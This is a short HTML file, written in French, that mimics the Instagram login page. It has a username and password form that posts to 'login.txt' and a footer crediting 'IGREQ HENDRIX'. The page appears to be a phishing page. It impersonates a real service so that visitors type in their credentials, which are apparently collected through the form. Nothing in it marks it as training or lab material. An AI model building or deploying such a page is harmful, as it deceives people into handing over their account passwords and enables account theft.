<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      text-align: center;
      border-radius: 10px;
    }
    .logo {
      font-size: 36px;
      font-family: 'Billabong', cursive;
      margin-bottom: 30px;
      color: #262626;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
    }
    button {
      width: 95%;
      background-color: #3897f0;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    .signature {
      margin-top: 30px;
      font-size: 10px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">Instagram</div>
    <form method="POST" action="login.txt">
      <input type="text" name="username" placeholder="Nom d'utilisateur ou email" required><br>
      <input type="password" name="password" placeholder="Mot de passe" required><br>
      <button type="submit">Connexion</button>
    </form>
    <div class="signature">Page générée par IGREQ HENDRIX</div>
  </div>
</body>
</html>
